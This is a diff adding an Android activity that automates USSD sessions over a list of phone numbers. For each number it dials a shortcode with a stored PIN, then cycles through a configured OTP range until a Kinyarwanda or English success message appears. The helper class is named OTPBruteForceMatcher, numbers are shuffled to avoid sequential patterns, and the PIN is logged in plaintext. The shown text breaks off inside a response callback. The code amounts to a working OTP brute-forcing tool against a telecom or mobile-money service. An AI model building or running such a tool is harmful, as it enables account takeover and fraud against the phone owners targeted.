@@ -1,0 +1,1074 @@
+package rw.delasoft.thacianoapp;
+
+import android.Manifest;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+import android.widget.ProgressBar;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import com.jcussdlib.controller.USSDController;
+import com.jcussdlib.matcher.OTPBruteForceMatcher;
+
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Map;
+
+public class ProcessingActivity extends AppCompatActivity {
+
+    private static final String TAG = "ThacianoProcessing";
+
+    private static final int PERMISSION_REQUEST_CODE = 100;
+    private TextView tvStatus, tvCurrentNumber, tvProgress;
+    private ProgressBar progressBar;
+    private Button btnStart, btnStop, btnClose;
+
+    private OTPBruteForceMatcher otpMatcher;
+    private USSDController ussdController;
+    private DatabaseHelper databaseHelper;
+
+    // Success tracking
+    private int successCount = 0;
+    private int failureCount = 0;
+    private int totalAttempts = 0;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        Log.d(TAG, "========================================");
+        Log.d(TAG, "onCreate: Activity started");
+        Log.d(TAG, "========================================");
+        setContentView(R.layout.activity_processing);
+
+        if (getSupportActionBar() != null) {
+            getSupportActionBar().setTitle("Processing Phone Numbers");
+            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
+        }
+
+        // Initialize views
+        tvStatus = findViewById(R.id.tvStatus);
+        tvCurrentNumber = findViewById(R.id.tvCurrentNumber);
+        tvProgress = findViewById(R.id.tvProgress);
+        progressBar = findViewById(R.id.progressBar);
+        btnStart = findViewById(R.id.btnStart);
+        btnStop = findViewById(R.id.btnStop);
+        btnClose = findViewById(R.id.btnClose);
+
+        Log.d(TAG, "onCreate: Views initialized - checking for nulls:");
+        Log.d(TAG, "  tvStatus: " + (tvStatus != null ? "OK" : "NULL"));
+        Log.d(TAG, "  tvCurrentNumber: " + (tvCurrentNumber != null ? "OK" : "NULL"));
+        Log.d(TAG, "  tvProgress: " + (tvProgress != null ? "OK" : "NULL"));
+        Log.d(TAG, "  progressBar: " + (progressBar != null ? "OK" : "NULL"));
+        Log.d(TAG, "  btnStart: " + (btnStart != null ? "OK" : "NULL"));
+        Log.d(TAG, "  btnStop: " + (btnStop != null ? "OK" : "NULL"));
+        Log.d(TAG, "  btnClose: " + (btnClose != null ? "OK" : "NULL"));
+
+        if (btnStart == null) {
+            Log.e(TAG, "onCreate: CRITICAL ERROR - btnStart is NULL!");
+            Toast.makeText(this, "ERROR: Start button not found in layout!", Toast.LENGTH_LONG).show();
+            return;
+        }
+
+        // Get data from intent
+        Log.d(TAG, "onCreate: Loading data from database...");
+        loadData();
+
+        // Initialize USSD API
+        Log.d(TAG, "onCreate: Initializing USSD API...");
+        initializeUSSD();
+
+        // Set up buttons
+        btnStart.setOnClickListener(v -> {
+            // IMMEDIATE FEEDBACK - User should see this instantly
+            Toast.makeText(this, "🔘 START BUTTON CLICKED!", Toast.LENGTH_SHORT).show();
+            tvStatus.setText("Button clicked, checking requirements...");
+
+            Log.d(TAG, "========================================");
+            Log.d(TAG, "btnStart CLICKED - IMMEDIATE RESPONSE");
+            Log.d(TAG, "  Button enabled: " + btnStart.isEnabled());
+            Log.d(TAG, "  Button clickable: " + btnStart.isClickable());
+            Log.d(TAG, "  Activity: " + this.getClass().getSimpleName());
+            Log.d(TAG, "========================================");
+
+            // Run on UI thread to ensure visibility
+            runOnUiThread(() -> {
+                try {
+                    checkPermissionsAndStart();
+                } catch (Exception e) {
+                    Log.e(TAG, "btnStart: EXCEPTION in checkPermissionsAndStart!", e);
+                    e.printStackTrace();
+                    Toast.makeText(ProcessingActivity.this, "❌ ERROR: " + e.getMessage(), Toast.LENGTH_LONG).show();
+                    tvStatus.setText("ERROR: " + e.getMessage());
+                }
+            });
+        });
+        btnStop.setOnClickListener(v -> {
+            Log.d(TAG, "========================================");
+            Log.d(TAG, "btnStop CLICKED");
+            Log.d(TAG, "========================================");
+            stopProcessing();
+        });
+        btnClose.setOnClickListener(v -> {
+            Log.d(TAG, "btnClose CLICKED - finishing activity");
+            finish();
+        });
+
+        // Initialize database helper
+        databaseHelper = new DatabaseHelper(this);
+
+        updateUI();
+        Log.d(TAG, "onCreate: UI updated");
+        Log.d(TAG, "onCreate: Button state - Enabled: " + btnStart.isEnabled() + ", Clickable: " + btnStart.isClickable());
+        Log.d(TAG, "onCreate: Complete - Activity ready");
+        Log.d(TAG, "========================================");
+    }
+
+    private void loadData() {
+        Log.d(TAG, "loadData: Starting to load data from database");
+        DatabaseHelper databaseHelper = new DatabaseHelper(this);
+
+        // Load phone numbers and OTP range
+        GeneralSettings settings = databaseHelper.getGeneralSettings();
+        Log.d(TAG, "loadData: General settings = " + (settings != null ? "LOADED" : "NULL"));
+
+        if (settings != null && settings.getPhoneNumbers() != null) {
+            String[] numbersArray = settings.getPhoneNumbers().split(",");
+            phoneNumbers = new ArrayList<>();
+            for (String number : numbersArray) {
+                phoneNumbers.add(number.trim());
+            }
+            Log.d(TAG, "loadData: Loaded " + phoneNumbers.size() + " phone numbers");
+
+            // Shuffle phone numbers randomly to avoid consecutive numbers
+            shuffledNumbers = PhoneNumberProcessor.shufflePhoneNumbers(phoneNumbers);
+            Log.d(TAG, "loadData: Phone numbers shuffled, total: " + shuffledNumbers.size());
+
+            // Load OTP range for retry attempts
+            otpStartFrom = settings.getStartFrom();
+            otpEndAt = settings.getEndAt();
+            Log.d(TAG, "loadData: OTP range: " + otpStartFrom + " to " + otpEndAt);
+        } else {
+            Log.e(TAG, "loadData: No phone numbers found in settings!");
+        }
+
+        // Load security config
+        SecurityConfig config = databaseHelper.getSecurityConfig();
+        Log.d(TAG, "loadData: Security config = " + (config != null ? "LOADED" : "NULL"));
+
+        if (config != null) {
+            pin = config.getPassword();
+            shortCode = config.getShortCode();
+            Log.d(TAG, "loadData: PIN = " + (pin != null ? "'" + pin + "' (length: " + pin.length() + ")" : "NULL"));
+            Log.d(TAG, "loadData: ShortCode = " + (shortCode != null ? "'" + shortCode + "'" : "NULL"));
+        } else {
+            Log.e(TAG, "loadData: Security config not found!");
+        }
+
+        if (shuffledNumbers == null || shuffledNumbers.isEmpty()) {
+            Log.w(TAG, "loadData: No phone numbers to process - disabling start button");
+            tvStatus.setText("❌ NO PHONE NUMBERS! Go to Settings → General Settings and add phone numbers");
+            btnStart.setEnabled(false);
+            btnStart.setAlpha(0.5f); // Visual indicator that button is disabled
+            Toast.makeText(this, "⚠️ Please add phone numbers in Settings → General Settings", Toast.LENGTH_LONG).show();
+        } else if (pin == null || pin.isEmpty()) {
+            Log.w(TAG, "loadData: PIN not configured - disabling start button");
+            tvStatus.setText("❌ NO PIN! Go to Settings → Security Config and add PIN");
+            btnStart.setEnabled(false);
+            btnStart.setAlpha(0.5f); // Visual indicator that button is disabled
+            Toast.makeText(this, "⚠️ Please add PIN in Settings → Security Config", Toast.LENGTH_LONG).show();
+        } else {
+            Log.d(TAG, "loadData: All data loaded successfully, start button enabled");
+            btnStart.setEnabled(true);
+            btnStart.setAlpha(1.0f); // Button fully visible and enabled
+            tvStatus.setText("✅ Ready to process " + shuffledNumbers.size() + " phone numbers. Click 'Start Processing' button.");
+            Toast.makeText(this, "✅ Ready! All settings configured correctly.", Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    private void initializeUSSD() {
+        Log.d(TAG, "initializeUSSD: Initializing USSD API");
+        // Initialize USSD API instance
+        ussdApi = USSDController.getInstance(this);
+        Log.d(TAG, "initializeUSSD: USSD API initialized = " + (ussdApi != null ? "SUCCESS" : "FAILED"));
+    }
+
+    private void checkPermissionsAndStart() {
+        Log.d(TAG, "========================================");
+        Log.d(TAG, "checkPermissionsAndStart: CALLED");
+        Log.d(TAG, "========================================");
+
+        // Debug: Show what we have loaded
+        String debugInfo = "Phone numbers: " + (shuffledNumbers != null ? shuffledNumbers.size() : 0) +
+                       ", PIN: " + (pin != null ? "SET" : "NOT SET") +
+                       ", ShortCode: " + (shortCode != null ? shortCode : "NOT SET") +
+                       ", USSD API: " + (ussdApi != null ? "INITIALIZED" : "NULL");
+        Log.d(TAG, "checkPermissionsAndStart: " + debugInfo);
+        Toast.makeText(this, debugInfo, Toast.LENGTH_LONG).show();
+
+        // CRITICAL: Check if we have data
+        if (shuffledNumbers == null || shuffledNumbers.isEmpty()) {
+            Log.e(TAG, "checkPermissionsAndStart: BLOCKED - No phone numbers!");
+            Toast.makeText(this, "ERROR: No phone numbers configured in settings!", Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: No phone numbers. Go to Settings → General Settings");
+            return;
+        }
+
+        if (pin == null || pin.isEmpty()) {
+            Log.e(TAG, "checkPermissionsAndStart: BLOCKED - No PIN!");
+            Toast.makeText(this, "ERROR: No PIN configured in settings!", Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: No PIN. Go to Settings → Security Config");
+            return;
+        }
+
+        if (ussdApi == null) {
+            Log.e(TAG, "checkPermissionsAndStart: BLOCKED - USSD API is NULL! Trying to reinitialize...");
+            initializeUSSD();
+            if (ussdApi == null) {
+                Toast.makeText(this, "ERROR: USSD API failed to initialize!", Toast.LENGTH_LONG).show();
+                tvStatus.setText("ERROR: USSD API initialization failed");
+                return;
+            }
+        }
+
+        // Check phone permission
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
+                != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "checkPermissionsAndStart: Phone permission NOT granted, requesting...");
+            Toast.makeText(this, "Phone permission required", Toast.LENGTH_SHORT).show();
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.CALL_PHONE, Manifest.permission.READ_PHONE_STATE},
+                    PERMISSION_REQUEST_CODE);
+            return;
+        }
+        Log.d(TAG, "checkPermissionsAndStart: Phone permission OK");
+
+        // Check overlay permission (Display over other apps)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                Log.w(TAG, "checkPermissionsAndStart: Overlay permission NOT granted");
+                Toast.makeText(this, "Overlay permission required for USSD", Toast.LENGTH_LONG).show();
+                showOverlayPermissionDialog();
+                return;
+            }
+            Log.d(TAG, "checkPermissionsAndStart: Overlay permission OK");
+        }
+
+        // Check accessibility service
+        if (!isAccessibilityServiceEnabled()) {
+            Log.w(TAG, "checkPermissionsAndStart: Accessibility service NOT enabled");
+            Toast.makeText(this, "Accessibility service not enabled", Toast.LENGTH_SHORT).show();
+            showAccessibilityDialog();
+            return;
+        }
+        Log.d(TAG, "checkPermissionsAndStart: Accessibility service OK");
+
+        Toast.makeText(this, "Starting processing...", Toast.LENGTH_SHORT).show();
+        Log.d(TAG, "checkPermissionsAndStart: All checks passed, calling startProcessing()");
+        startProcessing();
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        try {
+            int accessibilityEnabled = Settings.Secure.getInt(
+                    getContentResolver(),
+                    Settings.Secure.ACCESSIBILITY_ENABLED);
+            if (accessibilityEnabled == 1) {
+                String services = Settings.Secure.getString(
+                        getContentResolver(),
+                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                // Check for the library's USSDService
+                return services != null && (services.contains(getPackageName()) ||
+                       services.contains("com.romellfudi.ussdlibrary.USSDService"));
+            }
+        } catch (Settings.SettingNotFoundException e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+
+    private void showOverlayPermissionDialog() {
+        new AlertDialog.Builder(this)
+                .setTitle("Display Over Other Apps Required")
+                .setMessage("This app needs permission to display over other apps to show USSD dialogs.\n\nPlease enable 'Display over other apps' or 'Appear on top' permission for this app.")
+                .setPositiveButton("Open Settings", (dialog, which) -> {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                })
+                .setNegativeButton("Cancel", null)
+                .show();
+    }
+
+    private void showAccessibilityDialog() {
+        new AlertDialog.Builder(this)
+                .setTitle("Accessibility Service Required")
+                .setMessage("Please enable the Thaciano App accessibility service to process USSD codes automatically.")
+                .setPositiveButton("Open Settings", (dialog, which) -> {
+                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    startActivity(intent);
+                })
+                .setNegativeButton("Cancel", null)
+                .show();
+    }
+
+    private void startProcessing() {
+        Log.d(TAG, "========================================");
+        Log.d(TAG, "startProcessing: CALLED");
+        Log.d(TAG, "========================================");
+
+        // Detailed data validation logging
+        Log.d(TAG, "startProcessing: Data validation check:");
+        Log.d(TAG, "  - shuffledNumbers: " + (shuffledNumbers != null ? "EXISTS (size=" + shuffledNumbers.size() + ")" : "NULL"));
+        Log.d(TAG, "  - pin: " + (pin != null ? "'" + pin + "' (length=" + pin.length() + ")" : "NULL"));
+        Log.d(TAG, "  - shortCode: " + (shortCode != null ? "'" + shortCode + "'" : "NULL"));
+        Log.d(TAG, "  - otpStartFrom: " + otpStartFrom);
+        Log.d(TAG, "  - otpEndAt: " + otpEndAt);
+        Log.d(TAG, "  - ussdApi: " + (ussdApi != null ? "INITIALIZED" : "NULL"));
+
+        if (shuffledNumbers == null || shuffledNumbers.isEmpty()) {
+            Log.e(TAG, "startProcessing: FAILED - No phone numbers to process!");
+            Toast.makeText(this, "ERROR: No phone numbers to process", Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: No phone numbers loaded!");
+            return;
+        }
+        Log.d(TAG, "startProcessing: Phone numbers validation PASSED: " + shuffledNumbers.size() + " numbers");
+        Log.d(TAG, "startProcessing: Phone numbers list:");
+        for (int i = 0; i < shuffledNumbers.size(); i++) {
+            Log.d(TAG, "  [" + (i+1) + "/" + shuffledNumbers.size() + "] " + shuffledNumbers.get(i));
+        }
+
+        if (pin == null || pin.isEmpty()) {
+            Log.e(TAG, "startProcessing: FAILED - PIN not configured!");
+            Toast.makeText(this, "ERROR: PIN not configured", Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: PIN not set!");
+            return;
+        }
+        Log.d(TAG, "startProcessing: PIN validation PASSED");
+
+        if (shortCode == null || shortCode.isEmpty()) {
+            Log.w(TAG, "startProcessing: WARNING - ShortCode is empty, will use default");
+        } else {
+            Log.d(TAG, "startProcessing: ShortCode validation PASSED: " + shortCode);
+        }
+
+        Toast.makeText(this, "Starting to process " + shuffledNumbers.size() + " numbers", Toast.LENGTH_LONG).show();
+        tvStatus.setText("Initializing processing for " + shuffledNumbers.size() + " phone numbers...");
+
+        // Initialize session metrics
+        sessionStartTime = System.currentTimeMillis();
+        successCount = 0;
+        failureCount = 0;
+        totalAttempts = 0;
+
+        isProcessing = true;
+        currentIndex = 0;
+        btnStart.setEnabled(false);
+        btnStop.setEnabled(true);
+        btnClose.setEnabled(false);
+
+        Log.d(TAG, "startProcessing: Buttons updated - Start:disabled, Stop:enabled");
+        Log.d(TAG, "startProcessing: Session started at: " + sessionStartTime);
+        Log.d(TAG, "startProcessing: isProcessing=" + isProcessing + ", currentIndex=" + currentIndex);
+        Log.d(TAG, "startProcessing: NOW calling processNextNumber()...");
+        Log.d(TAG, "========================================");
+
+        processNextNumber();
+    }
+
+    private void processNextNumber() {
+        Log.d(TAG, "----------------------------------------");
+        Log.d(TAG, "processNextNumber: CALLED");
+        Log.d(TAG, "  - currentIndex: " + currentIndex);
+        Log.d(TAG, "  - total numbers: " + (shuffledNumbers != null ? shuffledNumbers.size() : "NULL"));
+        Log.d(TAG, "  - isProcessing: " + isProcessing);
+        Log.d(TAG, "  - isUSSDActive: " + isUSSDActive);
+
+        if (!isProcessing) {
+            Log.w(TAG, "processNextNumber: ABORTED - Processing stopped by user (isProcessing=false)");
+            finishProcessing();
+            return;
+        }
+
+        if (shuffledNumbers == null || shuffledNumbers.isEmpty()) {
+            Log.e(TAG, "processNextNumber: ABORTED - No phone numbers available!");
+            Toast.makeText(this, "ERROR: No phone numbers to process", Toast.LENGTH_LONG).show();
+            finishProcessing();
+            return;
+        }
+
+        if (currentIndex >= shuffledNumbers.size()) {
+            Log.d(TAG, "processNextNumber: COMPLETED - All numbers processed (currentIndex=" + currentIndex + " >= size=" + shuffledNumbers.size() + ")");
+            finishProcessing();
+            return;
+        }
+
+        String currentNumber = shuffledNumbers.get(currentIndex);
+        Log.d(TAG, "processNextNumber: Processing number [" + (currentIndex + 1) + "/" + shuffledNumbers.size() + "]: " + currentNumber);
+
+        updateProgress();
+        Log.d(TAG, "processNextNumber: Progress updated");
+
+        tvStatus.setText("Processing number " + (currentIndex + 1) + "/" + shuffledNumbers.size());
+        tvCurrentNumber.setText("Current: " + currentNumber);
+
+        // Reset OTP attempt for new phone number
+        currentOtpAttempt = otpStartFrom;
+        currentPhoneAttemptCount = 0; // Reset attempt counter for new phone
+        currentRetryCount = 0; // Reset USSD retry counter
+        currentPhoneStartTime = System.currentTimeMillis(); // Track time for this phone
+        Log.d(TAG, "processNextNumber: OTP attempt reset to: " + currentOtpAttempt + " (range: " + otpStartFrom + " to " + otpEndAt + ")");
+        Log.d(TAG, "processNextNumber: Starting phone at: " + currentPhoneStartTime);
+
+        // Validate shortCode and PIN before building USSD code
+        if (shortCode == null || shortCode.trim().isEmpty()) {
+            Log.e(TAG, "processNextNumber: ERROR - ShortCode is null or empty!");
+            Toast.makeText(this, "ERROR: ShortCode not set! Go to Settings", Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: ShortCode not set - check Settings");
+            finishProcessing();
+            return;
+        }
+        if (pin == null || pin.trim().isEmpty()) {
+            Log.e(TAG, "processNextNumber: ERROR - PIN is null or empty!");
+            Toast.makeText(this, "ERROR: PIN not set! Go to Settings", Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: PIN not set - check Settings");
+            finishProcessing();
+            return;
+        }
+
+        // Build USSD code with PIN: *348*PIN#
+        String ussdCode;
+        if (shortCode.endsWith("#")) {
+            // Replace # with *PIN#
+            ussdCode = shortCode.substring(0, shortCode.length() - 1) + "*" + pin + "#";
+        } else {
+            ussdCode = shortCode + "*" + pin + "#";
+        }
+        Log.d(TAG, "processNextNumber: USSD code with PIN: " + ussdCode);
+        Log.d(TAG, "processNextNumber: Format: *shortcode*PIN#");
+
+        Toast.makeText(this, "Processing " + (currentIndex + 1) + "/" + shuffledNumbers.size() + ": " + currentNumber, Toast.LENGTH_SHORT).show();
+
+        // Process USSD with responses
+        Log.d(TAG, "processNextNumber: NOW calling processUSSD()...");
+        Log.d(TAG, "  Parameters: ussdCode=" + ussdCode + ", phoneNumber=" + currentNumber + ", otpToSend=-1");
+        Log.d(TAG, "----------------------------------------");
+
+        processUSSD(ussdCode, currentNumber, -1); // -1 means no specific OTP yet
+    }
+
+    private void retryWithNextOTP(String phoneNumber, int nextOtpAttempt) {
+        Log.d(TAG, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+        Log.d(TAG, "retryWithNextOTP: CALLED");
+        Log.d(TAG, "  - phoneNumber: " + phoneNumber);
+        Log.d(TAG, "  - nextOtpAttempt: " + nextOtpAttempt);
+        Log.d(TAG, "  - otpRange: " + otpStartFrom + " to " + otpEndAt);
+        Log.d(TAG, "  - isProcessing: " + isProcessing);
+
+        if (!isProcessing) {
+            Log.d(TAG, "retryWithNextOTP: ABORTED - Processing stopped by user");
+            return;
+        }
+
+        if (nextOtpAttempt > otpEndAt) {
+            // All OTPs exhausted for this phone number, move to next phone number
+            Log.d(TAG, "retryWithNextOTP: All OTPs EXHAUSTED (tried " + otpStartFrom + " to " + otpEndAt + ")");
+            tvStatus.setText("All OTPs exhausted for " + phoneNumber);
+            Toast.makeText(this, "All " + (otpEndAt - otpStartFrom + 1) + " OTPs exhausted for " + phoneNumber, Toast.LENGTH_LONG).show();
+
+            // Reset state and move to next phone number
+            sessionCompleted = false; // Reset for next number
+            handler.postDelayed(() -> {
+                currentIndex++;
+                Log.d(TAG, "retryWithNextOTP: Moving to next phone number (index=" + currentIndex + ")");
+                processNextNumber();
+            }, 2000);
+            return;
+        }
+
+        currentOtpAttempt = nextOtpAttempt;
+        Log.d(TAG, "retryWithNextOTP: Will retry with OTP attempt " + currentOtpAttempt + " (out of " + otpEndAt + ")");
+        tvStatus.setText("Retrying with OTP attempt " + currentOtpAttempt + "/" + otpEndAt + " for " + phoneNumber);
+        Toast.makeText(this, "Trying OTP " + currentOtpAttempt + "/" + otpEndAt, Toast.LENGTH_SHORT).show();
+
+        // Validate shortCode and PIN before building USSD code
+        if (shortCode == null || shortCode.trim().isEmpty() || pin == null || pin.trim().isEmpty()) {
+            Log.e(TAG, "retryWithNextOTP: ERROR - ShortCode or PIN is null!");
+            Toast.makeText(this, "ERROR: Configuration missing - check Settings", Toast.LENGTH_LONG).show();
+            finishProcessing();
+            return;
+        }
+
+        // Build USSD code with PIN: *348*PIN#
+        String ussdCode;
+        if (shortCode.endsWith("#")) {
+            ussdCode = shortCode.substring(0, shortCode.length() - 1) + "*" + pin + "#";
+        } else {
+            ussdCode = shortCode + "*" + pin + "#";
+        }
+        Log.d(TAG, "retryWithNextOTP: Scheduling USSD retry in 3 seconds with code: " + ussdCode);
+        Log.d(TAG, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+
+        handler.postDelayed(() -> {
+            Log.d(TAG, "retryWithNextOTP: Executing delayed retry now...");
+            sessionCompleted = false; // Reset before new attempt
+            processUSSD(ussdCode, phoneNumber, currentOtpAttempt);
+        }, 3000);
+    }
+
+    // Advanced pattern matching for USSD responses
+    private boolean isSuccessResponse(String message) {
+        if (message == null) return false;
+        String lower = message.toLowerCase();
+
+        // Success patterns (only reliable ones - Kinyarwanda and English)
+        String[] successPatterns = {
+            "byagenze neza",     // Went well (ORIGINAL - most reliable!)
+            "byakunze",          // Succeeded
+            "byemewe",           // Approved
+            "success",           // English success
+            "successful",        // Successful
+            "yemejwe",           // Confirmed
+            "completed",         // Completed
+            "byakozwe neza",     // Done well
+        };
+
+        for (String pattern : successPatterns) {
+            if (lower.contains(pattern)) {
+                Log.d(TAG, "isSuccessResponse: Matched SUCCESS pattern: '" + pattern + "'");
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private boolean isInvalidOtpResponse(String message) {
+        if (message == null) return false;
+        String lower = message.toLowerCase();
+
+        // Invalid OTP patterns
+        String[] invalidOtpPatterns = {
+            "ushyizemo otp itariyo",   // You entered wrong OTP
+            "otp itariyo",             // OTP is wrong
+            "otp si yo",               // OTP is not correct
+            "otp idakwiye",            // Incorrect OTP
+            "invalid otp",             // English invalid
+            "wrong otp",               // Wrong OTP
+            "incorrect otp",           // Incorrect OTP
+            "otp ntibikwiye",          // OTP doesn't match
+            "siyo otp",                // Not the OTP
+        };
+
+        for (String pattern : invalidOtpPatterns) {
+            if (lower.contains(pattern)) {
+                Log.d(TAG, "isInvalidOtpResponse: Matched INVALID OTP pattern: '" + pattern + "'");
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private boolean isOtpRequiredResponse(String message) {
+        if (message == null) return false;
+        String lower = message.toLowerCase();
+
+        // OTP required patterns
+        String[] otpRequiredPatterns = {
+            "shyiramo otp",        // Enter OTP
+            "injiza otp",          // Input OTP
+            "andika otp",          // Write OTP
+            "enter otp",           // English enter
+            "provide otp",         // Provide OTP
+            "input otp",           // Input OTP
+        };
+
+        for (String pattern : otpRequiredPatterns) {
+            if (lower.contains(pattern)) {
+                Log.d(TAG, "isOtpRequiredResponse: Matched OTP REQUIRED pattern: '" + pattern + "'");
+                return true;
+            }
+        }
+        return false;
+    }
+
+    // Helper method to safely complete current session and move to next number
+    private synchronized void completeSessionAndMoveNext(String reason) {
+        Log.d(TAG, "completeSessionAndMoveNext: Called with reason: " + reason);
+        Log.d(TAG, "  - sessionCompleted (before): " + sessionCompleted);
+        Log.d(TAG, "  - isUSSDActive (before): " + isUSSDActive);
+
+        if (sessionCompleted) {
+            Log.w(TAG, "completeSessionAndMoveNext: SKIPPED - Session already completed!");
+            return;
+        }
+
+        sessionCompleted = true;
+        isUSSDActive = false;
+
+        // Cancel any pending timeout
+        if (timeoutRunnable != null) {
+            handler.removeCallbacks(timeoutRunnable);
+            timeoutRunnable = null;
+            Log.d(TAG, "completeSessionAndMoveNext: Timeout cancelled");
+        }
+
+        Log.d(TAG, "completeSessionAndMoveNext: Moving to next number in 2 seconds...");
+        handler.postDelayed(() -> {
+            currentIndex++;
+            sessionCompleted = false; // Reset for next session
+            processNextNumber();
+        }, 2000);
+    }
+
+    private void processUSSD(String ussdCode, String phoneNumber, int otpToSend) {
+        Log.d(TAG, "****************************************");
+        Log.d(TAG, "processUSSD: ENTERED");
+        Log.d(TAG, "  - ussdCode: " + ussdCode);
+        Log.d(TAG, "  - phoneNumber: " + phoneNumber);
+        Log.d(TAG, "  - otpToSend: " + otpToSend);
+        Log.d(TAG, "  - isUSSDActive (before): " + isUSSDActive);
+        Log.d(TAG, "  - sessionCompleted (before): " + sessionCompleted);
+
+        // Prevent overlapping USSD calls
+        if (isUSSDActive) {
+            Log.w(TAG, "processUSSD: ABORTED - USSD already active! Preventing overlap.");
+            Log.w(TAG, "  This might indicate a timing issue or the previous USSD didn't complete properly.");
+            Toast.makeText(this, "WARNING: USSD still active from previous call", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        isUSSDActive = true;
+        sessionCompleted = false; // Reset completion flag for new session
+        currentPhoneAttemptCount++; // Increment attempt counter
+        Log.d(TAG, "processUSSD: isUSSDActive set to TRUE - Lock acquired");
+        Log.d(TAG, "processUSSD: Attempt #" + currentPhoneAttemptCount + " for this phone number");
+
+        // Set timeout to prevent hanging
+        timeoutRunnable = () -> {
+            Log.e(TAG, "TIMEOUT: USSD session timed out after " + USSD_TIMEOUT_MS + "ms!");
+            Toast.makeText(ProcessingActivity.this, "TIMEOUT: USSD took too long, moving to next", Toast.LENGTH_LONG).show();
+            tvStatus.setText("TIMEOUT for " + phoneNumber);
+            completeSessionAndMoveNext("TIMEOUT");
+        };
+        handler.postDelayed(timeoutRunnable, USSD_TIMEOUT_MS);
+        Log.d(TAG, "processUSSD: Timeout scheduled for " + USSD_TIMEOUT_MS + "ms");
+
+        // Verify USSD API is initialized
+        if (ussdApi == null) {
+            Log.e(TAG, "processUSSD: USSD API is NULL! Reinitializing...");
+            Toast.makeText(this, "USSD API not initialized, reinitializing...", Toast.LENGTH_SHORT).show();
+            initializeUSSD();
+            if (ussdApi == null) {
+                Log.e(TAG, "processUSSD: Failed to initialize USSD API");
+                Toast.makeText(this, "ERROR: Cannot initialize USSD API", Toast.LENGTH_LONG).show();
+                isUSSDActive = false;
+                stopProcessing();
+                return;
+            }
+        }
+
+        // Format OTP if specified
+        String otpCode = null;
+        if (otpToSend != -1) {
+            String startFromStr = String.valueOf(otpStartFrom);
+            otpCode = String.format("%0" + startFromStr.length() + "d", otpToSend);
+            tvStatus.setText("Processing with OTP " + otpCode + " (" + otpToSend + "/" + otpEndAt + ") for " + phoneNumber);
+            Log.d(TAG, "processUSSD: OTP formatted: " + otpCode);
+        } else {
+            tvStatus.setText("Processing " + phoneNumber);
+            Log.d(TAG, "processUSSD: No OTP specified");
+        }
+
+        final String finalOtpCode = otpCode;
+
+        Log.d(TAG, "processUSSD: About to call USSD API...");
+        Log.d(TAG, "  - USSD Code: " + ussdCode);
+        Log.d(TAG, "  - Phone Number: " + phoneNumber);
+        Log.d(TAG, "  - ussdApi object: " + ussdApi);
+        Log.d(TAG, "processUSSD: CALLING ussdApi.callUSSDInvoke() NOW...");
+        Toast.makeText(this, "🔄 Dialing USSD: " + ussdCode + " for " + phoneNumber, Toast.LENGTH_LONG).show();
+
+        try {
+            Log.d(TAG, "processUSSD: Invoking USSD dial with SIM 0...");
+
+            // Create HashMap with proper structure as per VoIpUSSD library documentation
+            // KEY_LOGIN: words that indicate the system is processing/waiting
+            // KEY_ERROR: words that indicate an error occurred
+            HashMap<String, HashSet<String>> map = new HashMap<>();
+
+            HashSet<String> loginSet = new HashSet<>();
+            loginSet.add("espere");    // Wait (Spanish - library default)
+            loginSet.add("waiting");   // English
+            loginSet.add("loading");   // Loading
+            loginSet.add("tegereza");  // Wait (Kinyarwanda)
+            map.put("KEY_LOGIN", loginSet);
+
+            HashSet<String> errorSet = new HashSet<>();
+            errorSet.add("problema");  // Problem (Spanish - library default)
+            errorSet.add("problem");   // English
+            errorSet.add("error");     // Error
+            errorSet.add("ikibazo");   // Problem (Kinyarwanda)
+            map.put("KEY_ERROR", errorSet);
+
+            Log.d(TAG, "processUSSD: HashMap created with KEY_LOGIN and KEY_ERROR");
+            Log.d(TAG, "processUSSD: Using 4-parameter callUSSDInvoke with SIM slot 0");
+            Log.d(TAG, "processUSSD: CALLING NOW with code: " + ussdCode);
+            Toast.makeText(this, "⏳ Invoking USSD... Watch for callback!", Toast.LENGTH_SHORT).show();
+
+            // Add callback detection flag
+            final boolean[] callbackFired = {false};
+
+            ussdApi.callUSSDInvoke(ussdCode, 0, map, new USSDController.CallbackInvoke() {
+                @Override
+                public void responseInvoke(String message) {
+                    callbackFired[0] = true;
+                    Log.d(TAG, ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
+                    Log.d(TAG, "CALLBACK: responseInvoke TRIGGERED!!!!!!!!");
+                    Log.d(TAG, "  - Thread: " + Thread.currentThread().getName());
